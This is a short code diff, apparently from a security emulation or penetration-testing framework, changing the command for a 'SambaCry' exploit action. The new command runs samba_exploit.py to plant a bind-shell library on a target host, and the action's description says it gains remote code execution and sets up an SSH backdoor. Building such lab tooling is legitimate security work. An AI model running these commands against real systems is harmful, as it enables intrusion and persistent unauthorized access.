@@ -68,10 +68,8 @@ class ShellActions:
         :return: the action
         """
         id = ActionId.SAMBACRY_EXPLOIT
-        cmd = ["sudo service ssh start",
-               "sudo /root/miniconda3/envs/samba/bin/python /samba_exploit.py -e /libbindshell-samba.so -s data -r /data/libbindshell-samba.so -u sambacry -p nosambanocry -P 6699 -t {}",
-               "/samba_exploit.py -e /libbindshell-samba.so -s data -r /data/libbindshell-samba.so -u sambacry -p nosambanocry -P 6699 -t {}"
-               ]
+        cmd = ["sudo /root/miniconda3/envs/samba/bin/python /samba_exploit.py -e /libbindshell-samba.so -s data "
+               "-r /data/libbindshell-samba.so -u sambacry -p nosambanocry -P 6699 -t {}"]
         return Action(id=id, name="Sambacry Explolit", cmd=cmd,
                       type=ActionType.EXPLOIT,
                       descr="Uses the sambacry shell to get remote code execution and then sets up a SSH backdoor "
